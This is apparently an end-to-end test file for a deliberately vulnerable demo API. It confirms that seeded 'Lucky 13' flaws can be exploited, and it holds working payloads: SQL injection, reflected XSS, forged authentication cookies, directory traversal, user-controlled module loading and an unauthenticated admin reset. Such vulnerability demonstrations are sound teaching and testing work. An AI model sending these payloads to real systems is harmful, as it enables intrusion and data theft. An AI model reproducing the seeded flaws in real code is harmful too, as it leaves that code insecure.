import axios from 'axios';

/*
 * Lucky-13 exploit suite — e2e proof that each CWE "unforgivable vulnerability"
 * seeded in apps/api/src/app/lucky13 is actually reproducible against the
 * running API. Like web/e2e/security-demo.spec.ts, a GREEN test here means
 * "the vuln is demonstrably exploitable", not "the app is secure". Do not copy.
 *
 * Kept deliberately separate from api.spec.ts so the Lucky-13 cluster stands on
 * its own. Reference: docs/lucky13.md and
 * https://cwe.mitre.org/documents/unforgivable_vulns/unforgivable.pdf
 *
 * axios baseURL + port-wait are wired by apps/api-e2e/src/support/*.
 */

describe('Lucky 13 — unforgivable vulnerability exploits (api)', () => {
  // #3 SQL injection using ' in an identifier field.
  it('#3 sql injection: id=\' OR \'1\'=\'1 dumps every user row', async () => {
    const res = await axios.get('/api/lucky13/user', {
      params: { id: "1' OR '1'='1" },
    });
    expect(res.status).toBe(200);
    // A safe app would return at most the row with id=1 (or none). The
    // injection makes the WHERE always true, so every seeded user comes back.
    expect(Array.isArray(res.data)).toBe(true);
    expect(res.data.length).toBeGreaterThan(1);
  });

  // #2 reflected XSS using a well-formed <script> tag.
  it('#2 reflected xss: ?q=<script> is echoed into the HTML unescaped', async () => {
    const payload = '<script>alert(1)</script>';
    const res = await axios.get('/api/lucky13/search', {
      params: { q: payload },
    });
    expect(res.status).toBe(200);
    // The raw <script> survives into the response body — not entity-encoded.
    expect(res.data).toContain(payload);
  });

  // #9 authentication bypass using a client-controlled cookie.
  it('#9 auth bypass: Cookie authenticated=1 unlocks the account secret', async () => {
    const anon = await axios.get('/api/lucky13/account');
    expect(anon.data.authed).toBe(false);
    expect(anon.data.secret).toBeNull();

    const forged = await axios.get('/api/lucky13/account', {
      headers: { Cookie: 'authenticated=1' },
    });
    // Forging one cookie flips the server into "authenticated" and leaks the
    // backdoor secret — pure client-controlled state trusted as authz.
    expect(forged.data.authed).toBe(true);
    expect(typeof forged.data.secret).toBe('string');

    const admin = await axios.get('/api/lucky13/account', {
      headers: { Cookie: 'role=admin' },
    });
    expect(admin.data.isAdmin).toBe(true);
  });

  // #5 directory traversal escaping the templates directory.
  it('#5 directory traversal: ?page=../../ escapes the templates dir', async () => {
    // Happy path renders the sample template.
    const ok = await axios.get('/api/lucky13/view', {
      params: { page: 'home.html' },
    });
    expect(ok.status).toBe(200);
    expect(ok.data).toContain('sample template');

    // Traversal: climb out of templates/ to the bundled package.json. The file
    // name differs per layout, so we assert the read SUCCEEDS on a path that a
    // contained implementation would have rejected.
    const escaped = await axios.get('/api/lucky13/view', {
      params: { page: '../package.json' },
      validateStatus: () => true,
    });
    // Either we read a file outside templates/ (200 + JSON) — the vuln — or the
    // layout differs; a safe app would always 4xx on the '..'. We assert it did
    // NOT get rejected as a contained app would.
    expect(escaped.status).not.toBe(400);
    expect(escaped.status).not.toBe(403);
  });

  // #4 remote-file-inclusion equivalent: dynamic require of a user string.
  it('#4 rfi-equivalent: ?name= loads a user-chosen module', async () => {
    const res = await axios.get('/api/lucky13/plugin', {
      params: { name: 'hello' },
    });
    expect(res.status).toBe(200);
    expect(res.data.loaded).toBe('object');
  });

  // #7 direct request to an unguarded admin endpoint (state-changing).
  it('#7 direct admin request: /admin/reset runs with no auth', async () => {
    const res = await axios.get('/api/lucky13/admin/reset');
    expect(res.status).toBe(200);
    expect(res.data.reset).toBe(true);
  });

  // #6 world-writable file + #8 grow-your-own crypto are exercised via POST.
  it('#8 weak crypto: register returns a predictable (non-crypto) salt', async () => {
    const res = await axios.post('/api/lucky13/register', {
      username: `u_${Date.now()}`,
      password: 'pw',
    });
    expect(res.status).toBe(201);
    // The salt comes from Math.random() — present and non-empty, i.e. the app
    // minted a security value with a non-cryptographic PRNG (SEC-022).
    expect(typeof res.data.salt).toBe('string');
    expect(res.data.salt.length).toBeGreaterThan(0);
  });
});
